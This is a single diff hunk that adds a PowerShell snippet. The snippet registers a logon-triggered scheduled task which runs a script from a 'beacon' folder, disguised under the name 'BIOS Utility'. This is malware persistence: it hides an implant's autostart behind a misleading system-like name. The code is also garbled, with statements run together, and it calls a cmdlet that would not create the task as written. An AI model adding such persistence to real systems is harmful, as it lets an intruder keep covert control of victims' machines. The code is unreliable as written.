@@ -1,0 +1,1 @@
+$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "C:\temp\beacon\run.ps1"$Trigger = New-ScheduledTaskTrigger -AtLogOnSet-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "BIOS Utility"
